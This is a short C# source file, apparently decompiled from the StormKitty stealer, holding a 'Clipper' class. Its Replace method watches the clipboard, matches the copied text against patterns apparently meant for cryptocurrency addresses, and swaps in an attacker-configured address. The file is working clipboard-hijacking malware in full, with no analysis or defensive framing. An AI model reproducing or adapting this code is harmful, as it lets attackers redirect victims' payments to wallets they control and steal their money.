using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using StormKitty;

namespace Clipper
{
	// Token: 0x0200003F RID: 63
	internal sealed class Clipper
	{
		// Token: 0x06000111 RID: 273 RVA: 0x00008E58 File Offset: 0x00007058
		public static void Replace()
		{
			string clipboardText = ClipboardManager.ClipboardText;
			if (string.IsNullOrEmpty(clipboardText))
			{
				return;
			}
			foreach (KeyValuePair<string, Regex> keyValuePair in RegexPatterns.PatternsList)
			{
				string key = keyValuePair.Key;
				if (keyValuePair.Value.Match(clipboardText).Success)
				{
					string text = Config.ClipperAddresses[key];
					if (!string.IsNullOrEmpty(text) && !clipboardText.Equals(text))
					{
						Clipboard.SetText(text);
						Console.WriteLine("Clipper replaced to " + text);
						break;
					}
				}
			}
		}
	}
}
